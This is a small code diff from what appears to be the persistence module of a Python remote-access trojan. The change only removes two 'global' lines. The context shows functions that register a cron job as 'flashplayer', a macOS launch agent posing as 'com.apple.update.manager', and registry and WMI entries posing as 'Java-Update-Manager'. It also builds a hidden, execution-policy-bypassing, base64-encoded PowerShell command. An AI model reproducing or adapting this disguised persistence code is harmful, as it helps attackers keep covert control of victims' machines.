@@ -148,7 +148,6 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
 
 def _add_launch_agent(value=None, name='com.apple.update.manager'):
     try:
-        global template_plist
         if sys.platform == 'darwin':
             if not value:
                 if len(sys.argv):
@@ -225,7 +224,6 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
 
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
-        global template_wmi
         if os.name == 'nt' and not _methods['powershell_wmi'].established:
             if command:
                 cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
